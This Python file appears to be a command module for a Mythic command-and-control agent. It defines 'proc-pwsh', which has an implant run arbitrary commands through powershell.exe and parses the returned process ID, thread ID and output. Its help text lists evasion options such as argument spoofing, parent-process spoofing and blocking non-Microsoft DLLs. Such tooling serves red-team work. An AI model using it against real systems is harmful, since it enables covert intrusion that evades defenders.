from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from .Utils.u import *

class ProcPwshArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="command",
                cli_name="command",
                type=ParameterType.String,
                description="Command to execute via powershell.exe",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply command to execute")
            
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("command", self.command_line)
        self.add_arg("action", "pwsh")

class ProcPwshCommand(CommandBase):
    cmd = "proc-pwsh"
    needs_admin = False
    help_cmd = 'proc-pwsh -command [command]'
    description = \
    """
    Run a command via powershell.exe

    Examples:
        proc-pwsh -command ls

    Obs:
    This command behavior can be modified using:
        - "config -arg"  : to spoof the process createtion argument
        - "config -ppid" : to change parent process to spawn
        - "config -blockdlls" : to block non-microsoft dll for load in the process
        - "config -curdir" : to change current direct in the process information (dont change the execution path context) 
    """
    version = 1
    author = "@Oblivion"
    attackmapping = ["T1059", "T1059.001"]
    argument_class = ProcPwshArguments
    browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=True
    )

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        command = task.args.get_arg("command")
        task.args.add_arg("command", f"powershell.exe -c \"{command}\"")
        task.args.add_arg("action", "pwsh")
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            Success=True,
            DisplayParams=f"-command {command}",
            CommandName="proc"
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        
        RawResponse = bytes.fromhex(response)
        Psr = Parser(RawResponse, len(RawResponse))

        sub_id = int.from_bytes(Psr.Pad(1), byteorder="big")

        ProcID = Psr.Int32();
        TdID   = Psr.Int32();
        Output = Psr.Bytes();
        
        FinalOutput = f"[+] powershell.exe Created with ID: {ProcID} and Main Thread ID: {TdID}\n[+] Received {len(Output)} bytes from agent\n[+] Output:\n\n{Output.decode('cp850')}"

        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=task.Task.ID,
            Response=FinalOutput
        ))

        return PTTaskProcessResponseMessageResponse(
            TaskID=task.Task.ID,
            Success=True
        )